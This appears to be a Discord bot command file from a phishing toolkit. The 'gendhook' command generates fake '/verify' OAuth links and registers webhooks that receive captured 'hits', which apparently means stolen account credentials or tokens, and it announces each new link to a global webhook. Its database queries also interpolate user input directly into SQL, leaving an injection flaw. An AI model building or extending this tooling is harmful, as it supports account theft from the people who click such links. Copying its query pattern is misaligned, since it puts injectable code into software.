const { ApplicationCommandOptionType, WebhookClient } = require('discord.js')
const { ghookLink, domain } = require("../../../config.json");
const { query } = require('../../db/db');
const fs = require("fs")
const path = require("path")
module.exports = {
    name: "gendhook",
    description: 'Generate a dhooked oauth link',
    options: [
        {
            name: "webhook",
            description: `Webhook url to send hits to`,
            type: ApplicationCommandOptionType.String,
            required: true
        }, {
            name: "dhook",
            description: `The dhooked webhook to send hits to`,
            type: ApplicationCommandOptionType.String,
            required: true
        },
        {
            name: "id",
            description: "ID of the link",
            type: ApplicationCommandOptionType.String,
            required: false
        }
    ],
    callback: async (client, interaction) => {
        const webhookURL = interaction.options.getString("webhook");
        const dhookURL = interaction.options.getString("dhook");
        const ID = interaction.options.getString("id") || generateID();

        let conf = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "..", "..", "config.json")))

        for (let roleId of conf.whitelistedroles) {
            if (interaction.member.roles.cache.has(roleId)) {
                let links = await query(`SELECT * FROM links WHERE link='${ID}'`)
                if (links.length != 0) {
                    return interaction.reply({
                        embeds: [{
                            title: `ERROR`,
                            description: `This id isn't unique, please choose another one!`,
                            color: 0xff0000
                        }],
                        ephemeral: true
                    })
                }
                // Test the webhook
                try {
                    let hook = new WebhookClient({ url: webhookURL });
                    hook.send({ content: `Will send hits to this channel` })
                } catch (e) {
                    return interaction.reply({ content: `Invalid webhook`, ephemeral: true })
                }

                try {
                    let hook = new WebhookClient({ url: dhookURL });
                    hook.send({ content: `Will send hits to this channel` })
                } catch (e) {
                    return interaction.reply({ content: `Invalid dhook`, ephemeral: true })
                }


                // Check if ID is unique


                //Store it into the database    
                try {
                    await query(`INSERT INTO links(link,owner_id,webhook,dhook) VALUES ('${ID}','${interaction.user.id}','${webhookURL}','${dhookURL}')`, "run")
                } catch (e) {
                    return interaction.reply({
                        embeds: [{
                            title: `ERROR`,
                            description: `Couldn't put the ID into the database!`,
                            color: 0xff0000
                        }],
                        ephemeral: true
                    })
                }
                const embed = {
                    title: `Success! :tada:`,
                    description: `Your premium oauth link has been generated successfully`,
                    color: 0x00ff00
                }
                interaction.reply({
                    content: `${domain}/verify/${ID}`,
                    embeds: [embed],
                    ephemeral: true
                })

                interaction.user.send({
                    content: `${domain}/verify/${ID}`,
                    embeds: [embed],
                    ephemeral: true
                })
                // Send it to the global hook
                try {
                    let ghook = new WebhookClient({ url: ghookLink });



                    ghook.send({
                        content: `<@${interaction.user.id}>`,
                        embeds: [embed]
                    })



                } catch (e) {
                    console.log(`Global hook isn't working! ${e}`)
                }
                return
            }

        }

        return interaction.reply({
            embeds: [{
                title: `Invalid permissions`,
                description: `You don't have enough permissions to run this command`,
                color: 0xff0000
            }],
            ephemeral: true
        })

    }
}
function generateID() {
    var length = 8,
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
        retVal = "";
    for (var i = 0, n = charset.length; i < length; ++i) {
        retVal += charset.charAt(Math.floor(Math.random() * n));
    }
    return retVal
}